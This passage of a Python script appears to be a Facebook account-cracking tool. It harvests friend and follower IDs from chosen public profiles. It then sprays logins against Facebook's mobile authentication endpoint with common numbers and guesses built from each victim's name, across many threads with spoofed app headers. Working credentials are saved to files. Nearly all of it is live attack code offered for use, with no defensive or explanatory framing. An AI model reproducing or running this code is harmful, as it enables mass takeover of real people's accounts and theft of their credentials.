																									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass12+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																									q = json.loads(data)
																									if "access_token" in q and "EAAA" in q:
																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
																										ok = open("ok.txt", "a")
																										ok.write(uid+"|"+pass12+"\n")
																										ok.close()
																										oks.append(uid+pass12)
																									else:
																										if "www.facebook.com" in q['error_msg']:
																											print(" \033[1;33m[TJ] "+uid+" | "+pass12+"\033[0;97m")
																											cp = open("rat.txt", "a")
																											cp.write(uid+"|"+pass12+"\n")
																											cp.close()
																											cps.append(uid+pass12)
																										else:
																											pass13 = "123456"
																											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass13+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																											q = json.loads(data)
																											if "access_token" in q and "EAAA" in q:
																												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
																												ok = open("ok.txt", "a")
																												ok.write(uid+"|"+pass13+"\n")
																												ok.close()
																												oks.append(uid+pass13)
																											else:
																												if "www.facebook.com" in q['error_msg']:
																													print(" \033[1;33m[TJ] "+uid+" | "+pass13+"\033[0;97m")
																													cp = open("rat.txt", "a")
																													cp.write(uid+"|"+pass13+"\n")
																													cp.close()
																													cps.append(uid+pass13)
																												else:
																													pass14 = "112233"
																													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass14+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																													q = json.loads(data)
																													if "access_token" in q and "EAAA" in q:
																														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
																														ok = open("ok.txt", "a")
																														ok.write(uid+"|"+pass14+"\n")
																														ok.close()
																														oks.append(uid+pass14)
																													else:
																														if "www.facebook.com" in q['error_msg']:
																															print(" \033[1;33m[TJ] "+uid+" | "+pass14+"\033[0;97m")
																															cp = open("rat.txt", "a")
																															cp.write(uid+"|"+pass14+"\n")
																															cp.close()
																															cps.append(uid+pass14)
																														else:
																															pass15 = "123356789"
																															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass15+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																															q = json.loads(data)
																															if "access_token" in q and "EAAA" in q:
																																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
																																ok = open("ok.txt", "a")
																																ok.write(uid+"|"+pass15+"\n")
																																ok.close()
																																oks.append(uid+pass15)
																															else:
																																if "www.facebook.com" in q['error_msg']:
																																	print(" \033[1;33m[TJ] "+uid+" | "+pass15+"\033[0;97m")
																																	cp = open("rat.txt", "a")
																																	cp.write(uid+"|"+pass15+"\n")
																																	cp.close()											
																																	cps.append(uid+pass15)
																																
		
												
										
										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m BOMBING COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()


def crack():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CHOOSE PATH TO CRACK THROUGH")
	print("")
	print("\033[92;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[91;1m  [0] BACK")
	print("")
	crack_select()
	
def crack_select():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  FB BOMBING HAS STARTED\x1b[0m")
	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		vaugent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': vaugent})
		try:
			pass1 = 1234567890
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[TJ] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("rat.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = 123123
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[TJ] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("rat.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = 654321
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[TJ] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("rat.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = 987654321
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[TJ] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("rat.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = 121212
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[TJ] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("rat.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[0] + '12345'
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[TJ] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("rat.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower().split(' ')[1] + '12345'
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[TJ] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("rat.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)


		except:
			pass
	p = ThreadPool()
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()


def crack2():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CHOOSE PATH TO CRACK THROUGH")
	print("")
	print("\033[92;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[91;1m  [0] BACK")
	print("")
	crack_select2()
	
def crack_select2():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select2()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  FB BOMBING HAS STARTED\x1b[0m")
	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		_azimua = random.choice(["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
		try:
			pass1 = name.lower().split(' ')[0] + '1234'
			api = 'https://b-api.facebook.com/method/auth.login'
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			data = requests.get(api, params=params, headers=headers_)
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[TJ] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("rat.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + '123'
					api = 'https://b-api.facebook.com/method/auth.login'
					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[TJ] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("rat.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[0] + '12'
							api = 'https://b-api.facebook.com/method/auth.login'
							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[TJ] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("rat.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower().split(' ')[1] + '1234'
									api = 'https://b-api.facebook.com/method/auth.login'
									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[TJ] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("rat.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower().split(' ')[1] + '123'
											api = 'https://b-api.facebook.com/method/auth.login'
											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[TJ] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("rat.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[1] + '12'
													api = 'https://b-api.facebook.com/method/auth.login'
													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[TJ] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("rat.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower()
															api = 'https://b-api.facebook.com/method/auth.login'
															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[TJ] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("rat.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
